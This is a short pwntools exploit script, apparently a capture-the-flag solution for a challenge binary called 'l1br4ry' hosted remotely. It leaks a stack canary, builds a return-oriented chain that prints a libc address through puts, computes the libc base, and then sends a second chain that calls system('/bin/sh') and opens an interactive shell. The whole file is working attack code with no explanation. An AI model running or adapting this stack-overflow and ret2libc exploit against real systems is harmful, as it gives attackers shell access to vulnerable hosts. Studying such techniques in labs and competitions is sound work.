import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.ELF("./l1br4ry")

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, gdbscript='''b *0x00000000004012b2\nc''')
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run",31174)
    libc = pwn.ELF("./libc.so.6")
else:
    io = pwn.process(elf.path)
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
io.recvuntil(b": ")
leak = int(io.recvline().strip(),16)
pwn.log.success("Canary: "+hex(leak))
ret = 0x000000000040101a
pop_rdi = 0x0000000000401323
canary = leak
payload = b'A'*0x18
payload += pwn.p64(canary)
payload += b'B'*8
payload += pwn.p64(pop_rdi)
payload += pwn.p64(elf.got['puts'])
payload += pwn.p64(elf.plt['puts'])
payload += pwn.p64(0x00000000004010f0)
io.send(payload)
io.recvuntil(b"system?\n")
libc_leak = io.recvline()[:-1]
libc_leak = pwn.unpack(libc_leak,'all')
pwn.log.info("LIBC_LEAK: "+hex(libc_leak))
libc.address = libc_leak - libc.symbols['puts']
pwn.log.success("LIBC_ADDRESS: "+hex(libc.address))
payload2 = b'A'*0x18
payload2 += pwn.p64(canary)
payload2 += b'B'*8
payload2 += pwn.p64(ret)
payload2 += pwn.p64(pop_rdi)
payload2 += pwn.p64(next(libc.search(b'/bin/sh\x00')))
payload2 += pwn.p64(libc.sym['system'])
io.sendline(payload2)
io.interactive()